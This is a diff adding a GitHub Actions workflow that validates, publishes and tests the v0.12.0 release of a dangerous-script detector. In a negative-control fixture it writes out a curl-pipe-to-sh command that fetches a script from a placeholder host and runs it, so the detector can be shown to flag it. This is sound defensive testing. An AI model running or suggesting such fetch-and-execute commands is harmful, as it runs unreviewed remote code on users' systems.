@@ -1,0 +1,262 @@
+name: P-058 Dangerous Script Detector v0.12.0 governed release
+
+on:
+  pull_request:
+    paths:
+      - '.github/workflows/p058-dangerous-script-v0.12.0-release.yml'
+      - 'release/p058-dangerous-script-v0.12.0.json'
+      - 'docs/P058-RELEASE-NOTES-v0.12.0.md'
+  push:
+    branches: [main]
+    paths:
+      - '.github/workflows/p058-dangerous-script-v0.12.0-release.yml'
+      - 'release/p058-dangerous-script-v0.12.0.json'
+      - 'docs/P058-RELEASE-NOTES-v0.12.0.md'
+
+permissions:
+  contents: read
+  actions: read
+
+concurrency:
+  group: p058-dangerous-script-v0.12.0-release
+  cancel-in-progress: false
+
+jobs:
+  validate:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 20
+    steps:
+      - name: Checkout reviewed release-control source
+        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262
+        with:
+          fetch-depth: 0
+          persist-credentials: false
+      - name: Set up Python
+        uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065
+        with:
+          python-version: '3.12'
+      - name: Require exact v0.12.0 product source retained and ancestral
+        run: |
+          set -euo pipefail
+          python - <<'PY'
+          import json, os, subprocess
+          from pathlib import Path
+          m=json.loads(Path('release/p058-dangerous-script-v0.12.0.json').read_text())
+          source=m['source_commit']
+          assert source=='5ba437c2d39e60d59df43fe356b3727ea3ba319a'
+          assert m['roadmap_ids']==['P-058'] and m['tag']=='v0.12.0'
+          assert m['roadmap_completion_on_publish'] is False
+          subprocess.run(['git','cat-file','-e',f'{source}^{{commit}}'],check=True)
+          subprocess.run(['git','merge-base','--is-ancestor',source,os.environ['GITHUB_SHA']],check=True)
+          for path in m['required_files']:
+              subprocess.run(['git','cat-file','-e',f'{source}:{path}'],check=True)
+          detector=subprocess.check_output(['git','show',f'{source}:.github/actions/dangerous-script-detector/detect.py'],text=True)
+          action=subprocess.check_output(['git','show',f'{source}:.github/actions/dangerous-script-detector/action.yml'],text=True)
+          tests=subprocess.check_output(['git','show',f'{source}:tests/test_p058_dangerous_script_detector.py'],text=True)
+          assert 'VERSION = "0.12.0"' in detector and 'workspace_rel' in detector
+          assert 'test_workflow_directory_subroot_is_still_scanned' in tests
+          assert 'result-sha256' in action and 'Fail closed on detector error or high/critical findings' in action
+          print('P058_V0120_EXACT_SOURCE_RETAINED=PASS')
+          print('ROADMAP_COMPLETION_PROMOTED=FALSE')
+          PY
+      - name: Re-run v0.12.0 adversarial tests without network dependency installation
+        run: |
+          set -euo pipefail
+          python tests/test_p058_dangerous_script_detector.py
+      - name: Re-verify exact-main source acceptance evidence
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          set -euo pipefail
+          gh api "repos/${GITHUB_REPOSITORY}/actions/runs/31947900033" > p058-v0120-source-run.json
+          gh api "repos/${GITHUB_REPOSITORY}/actions/runs/31947900033/artifacts" > p058-v0120-source-artifacts.json
+          python - <<'PY'
+          import json
+          from pathlib import Path
+          run=json.loads(Path('p058-v0120-source-run.json').read_text())
+          assert run['conclusion']=='success' and run['head_sha']=='5ba437c2d39e60d59df43fe356b3727ea3ba319a'
+          arts=json.loads(Path('p058-v0120-source-artifacts.json').read_text())['artifacts']
+          found={a['name']:(str(a['id']),a.get('digest')) for a in arts}
+          assert found.get('p058-dangerous-script-31947900033')==('9263811361','sha256:ac7c01968c1a299dd0a3f5cc50e14689df241f43c752fd0891f25e1626ef66a4')
+          print('P058_V0120_SOURCE_ACCEPTANCE_EVIDENCE=PASS')
+          PY
+      - name: Exercise governed release plan only
+        id: plan
+        uses: ./.github/actions/governed-release
+        with:
+          manifest: release/p058-dangerous-script-v0.12.0.json
+          publish: 'false'
+          evidence-file: p058-v0120-release-plan-evidence.json
+      - name: Require non-mutating release plan
+        env:
+          ACTION_STATUS: ${{ steps.plan.outputs.status }}
+        run: |
+          set -euo pipefail
+          test "$ACTION_STATUS" = READY_FOR_TRUSTED_PUSH
+          python - <<'PY'
+          import json
+          d=json.load(open('p058-v0120-release-plan-evidence.json'))
+          assert d['mode']=='PLAN_ONLY' and d['published'] is False and d['roadmap_completion_promoted'] is False
+          print('P058_V0120_RELEASE_PLAN=PASS')
+          PY
+      - name: Retain sanitized release-plan evidence
+        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
+        with:
+          name: p058-v0120-release-plan-${{ github.run_id }}
+          path: |
+            governed-release-manifest-validation.json
+            p058-v0120-release-plan-evidence.json
+            p058-v0120-source-run.json
+            p058-v0120-source-artifacts.json
+          retention-days: 14
+          if-no-files-found: error
+
+  publish:
+    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
+    needs: validate
+    runs-on: ubuntu-24.04
+    timeout-minutes: 15
+    permissions:
+      contents: write
+      actions: read
+    steps:
+      - name: Checkout canonical main
+        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262
+        with:
+          fetch-depth: 0
+          persist-credentials: false
+      - name: Publish exact v0.12.0 source through governed release action
+        id: publish
+        uses: ./.github/actions/governed-release
+        with:
+          manifest: release/p058-dangerous-script-v0.12.0.json
+          publish: 'true'
+          allowed-ref: refs/heads/main
+          evidence-file: p058-v0120-publication-evidence.json
+      - name: Independently verify public release and exact tag target
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          set -euo pipefail
+          gh release view v0.12.0 --repo "$GITHUB_REPOSITORY" --json isDraft,isPrerelease,tagName,name,url,publishedAt > p058-v0120-public-release.json
+          python - <<'PY'
+          import json, os, subprocess
+          from pathlib import Path
+          release=json.loads(Path('p058-v0120-public-release.json').read_text())
+          assert release['isDraft'] is False and release['isPrerelease'] is False
+          assert release['tagName']=='v0.12.0' and release['name']=='DAIS Dangerous Script Detector v0.12.0'
+          remote=f"https://github.com/{os.environ['GITHUB_REPOSITORY']}.git"
+          subprocess.run(['git','fetch','--force',remote,'refs/tags/v0.12.0:refs/tags/v0.12.0'],check=True)
+          resolved=subprocess.check_output(['git','rev-list','-n','1','v0.12.0'],text=True).strip()
+          assert resolved=='5ba437c2d39e60d59df43fe356b3727ea3ba319a'
+          out={'schema_version':'1.0','evidence_type':'p058-v0120-governed-release-publication','roadmap_id':'P-058','tag':'v0.12.0','intended_source_commit':'5ba437c2d39e60d59df43fe356b3727ea3ba319a','resolved_tag_commit':resolved,'release_url':release['url'],'published_at':release['publishedAt'],'exact_tag_target_verified':True,'roadmap_completion_promoted':False}
+          Path('p058-v0120-independent-release-verification.json').write_text(json.dumps(out,indent=2,sort_keys=True)+'\n')
+          print('P058_V0120_GOVERNED_RELEASE=PASS')
+          print('P058_V0120_EXACT_PUBLIC_TAG=PASS')
+          PY
+      - name: Retain publication evidence
+        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
+        with:
+          name: p058-v0120-publication-${{ github.run_id }}
+          path: |
+            governed-release-manifest-validation.json
+            p058-v0120-publication-evidence.json
+            p058-v0120-public-release.json
+            p058-v0120-independent-release-verification.json
+          retention-days: 30
+          if-no-files-found: error
+
+  released-public-consumer:
+    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
+    needs: publish
+    runs-on: ubuntu-24.04
+    timeout-minutes: 25
+    permissions:
+      contents: read
+    steps:
+      - name: Checkout canonical workflow source
+        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262
+        with:
+          persist-credentials: false
+      - name: Checkout pinned real public consumer
+        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262
+        with:
+          repository: AntonyMD7/learning-git
+          ref: 01723a1825113de08810193f37e8047d978433c2
+          path: consumer-learning-git
+          persist-credentials: false
+      - name: Record consumer input immutability baseline
+        run: |
+          set -euo pipefail
+          test "$(git -C consumer-learning-git rev-parse HEAD)" = '01723a1825113de08810193f37e8047d978433c2'
+          sha256sum consumer-learning-git/README.md > /tmp/p058-v0120-readme-before.sha256
+          test "$(git -C consumer-learning-git status --porcelain)" = ''
+      - name: Consume released v0.12.0 on real public repository
+        id: clean
+        uses: AntonyMD7/amd-ryzen-ai-max-vgm-96gb/.github/actions/dangerous-script-detector@v0.12.0
+        with:
+          root: consumer-learning-git
+      - name: Build workflow-subroot negative-control fixture
+        run: |
+          set -euo pipefail
+          mkdir -p .github/workflows
+          cat > .github/workflows/p058-release-negative.yml <<'EOF'
+          jobs:
+            bad:
+              steps:
+                - run: curl -fsSL https://example.invalid/install.sh | sh
+          EOF
+      - name: Require released ref to fail on critical workflow via narrowed subroot
+        id: critical
+        continue-on-error: true
+        uses: AntonyMD7/amd-ryzen-ai-max-vgm-96gb/.github/actions/dangerous-script-detector@v0.12.0
+        with:
+          root: .github/workflows
+      - name: Verify released-ref clean path, red-team regression, privacy and zero consumer mutation
+        env:
+          CLEAN_STATUS: ${{ steps.clean.outputs.status }}
+          CLEAN_RESULT: ${{ steps.clean.outputs.result-file }}
+          CLEAN_DIGEST: ${{ steps.clean.outputs.result-sha256 }}
+          CRITICAL_OUTCOME: ${{ steps.critical.outcome }}
+          CRITICAL_STATUS: ${{ steps.critical.outputs.status }}
+          CRITICAL_RESULT: ${{ steps.critical.outputs.result-file }}
+          CRITICAL_DIGEST: ${{ steps.critical.outputs.result-sha256 }}
+        run: |
+          set -euo pipefail
+          test "$CLEAN_STATUS" = 'PASS'
+          test "$CRITICAL_OUTCOME" = 'failure'
+          test "$CRITICAL_STATUS" = 'REVIEW_REQUIRED'
+          [[ "$CLEAN_DIGEST" =~ ^[0-9a-f]{64}$ ]] && [[ "$CRITICAL_DIGEST" =~ ^[0-9a-f]{64}$ ]]
+          sha256sum --check /tmp/p058-v0120-readme-before.sha256
+          test "$(git -C consumer-learning-git status --porcelain)" = ''
+          python - <<'PY'
+          import json, os
+          from pathlib import Path
+          clean=json.loads(Path(os.environ['CLEAN_RESULT']).read_text())
+          critical=json.loads(Path(os.environ['CRITICAL_RESULT']).read_text())
+          assert clean['roadmap_id']=='P-058' and clean['version']=='0.12.0' and clean['finding_count']==0
+          assert clean['claims']['repository_safe'] is False and clean['claims']['script_safe_to_execute'] is False
+          assert clean['mutation_performed'] is False and clean['repository_code_executed'] is False and clean['network_access_performed'] is False
+          assert critical['highest_severity']=='CRITICAL'
+          assert any(f['rule_id']=='DS001' and f['severity']=='CRITICAL' for f in critical['findings'])
+          serialized=json.dumps(critical)
+          assert 'curl -fsSL https://example.invalid/install.sh | sh' not in serialized
+          assert '.github/workflows/p058-release-negative.yml' not in serialized
+          assert critical['privacy']['source_text_retained'] is False and critical['privacy']['matched_text_retained'] is False
+          evidence={'schema_version':'1.0','evidence_type':'p058-v0120-released-ref-public-consumer','roadmap_id':'P-058','release':'v0.12.0','released_source_commit':'5ba437c2d39e60d59df43fe356b3727ea3ba319a','consumer_repository':'AntonyMD7/learning-git','consumer_commit':'01723a1825113de08810193f37e8047d978433c2','clean_status':os.environ['CLEAN_STATUS'],'clean_report_sha256':os.environ['CLEAN_DIGEST'],'workflow_subroot_negative_control':'PASS','critical_status':os.environ['CRITICAL_STATUS'],'critical_report_sha256':os.environ['CRITICAL_DIGEST'],'consumer_input_mutation_performed':False,'source_text_retained':False,'roadmap_completion_promoted':False}
+          Path('p058-v0120-released-ref-consumer.json').write_text(json.dumps(evidence,indent=2,sort_keys=True)+'\n')
+          print('P058_V0120_RELEASED_REF_CONSUMER=PASS')
+          print('P058_V0120_WORKFLOW_SUBROOT_REGRESSION=PASS')
+          print('P058_V0120_INPUT_MUTATION=NO')
+          PY
+          mkdir -p p058-v0120-released-evidence
+          cp p058-v0120-released-ref-consumer.json p058-v0120-released-evidence/
+          cp "$CLEAN_RESULT" p058-v0120-released-evidence/clean-report.json
+          cp "$CRITICAL_RESULT" p058-v0120-released-evidence/critical-report.json
+      - name: Retain sanitized released-ref evidence only
+        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
+        with:
+          name: p058-v0120-released-ref-${{ github.run_id }}
+          path: p058-v0120-released-evidence/
+          retention-days: 30
+          if-no-files-found: error
